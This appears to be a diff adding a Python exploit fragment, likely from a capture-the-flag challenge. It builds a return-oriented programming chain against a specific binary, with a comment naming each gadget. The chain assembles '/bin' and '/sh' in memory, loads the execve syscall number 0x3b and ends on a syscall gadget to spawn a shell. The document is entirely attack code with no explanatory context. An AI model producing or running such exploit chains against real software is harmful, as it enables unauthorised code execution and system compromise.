@@ -1,0 +1,35 @@
+payload = p64(0x46dc48)
+#0x000000000046dc48: pop rax; add al, 0; add cl, ch; ret; 
+payload += p64(0xb45a781)+p64(0x49e68e)
+# 0x49e68e: xchg esi, eax ; retf
+payload += p32(0x46dc48)+p32(0x33)
+# 0x000000000046dc48: pop rax; add al, 0; add cl, ch; ret; 
+payload += p64(0x6e69622f)+p64(0x499988)
+# 0x499988: add dword ptr [rsi*2 - 0x163fceaa], eax ; retf
+payload += p32(0x46dc48)+p32(0x33)
+# 0x000000000046dc48: pop rax; add al, 0; add cl, ch; ret; 
+payload += p64(0xb45a783)+p64(0x49e68e)
+# 0x49e68e: xchg esi, eax ; retf
+payload += p32(0x46dc48)+p32(0x33)
+# 0x000000000046dc48: pop rax; add al, 0; add cl, ch; ret; 
+payload += p64(0x68662f)+p64(0x499988)
+# 0x499988: add dword ptr [rsi*2 - 0x163fceaa], eax ; retf
+payload += p32(0x46dc48)+p32(0x33)
+# 0x000000000046dc48: pop rax; add al, 0; add cl, ch; ret; 
+payload += p64(0x0)+p64(0x49e68e)
+# 0x49e68e: xchg esi, eax ; retf
+payload += p32(0x46dc48)+p32(0x33)
+# 0x000000000046dc48: pop rax; add al, 0; add cl, ch; ret; 
+payload += p64(0x0)+p64(0x4a9f42)
+# 0x00000000004a9f42: xchg edx, eax; ret; 
+payload += p64(0x46dc48)
+# 0x000000000046dc48: pop rax; add al, 0; add cl, ch; ret; 
+payload += p64(0x4b81c0)+p64(0x41daad)
+# 0x41daad: pop rbx ; add byte ptr [rax], al ; clc ; add al, 0 ; retf
+payload += p64(0x7b3c7d90)+p32(0x47fce8)+p32(0x33)
+# 0x000000000047fce8: pop rdi; adc byte ptr [rbx - 0x7af0fc07], al; ret; 
+payload += p64(0x4b8058)+p64(0x46dc48)
+# 0x000000000046dc48: pop rax; add al, 0; add cl, ch; ret; 
+payload += p64(0x3b)+p64(0x415ed1)
+# 0x0000000000415ed1: syscall; 
+payload += b''
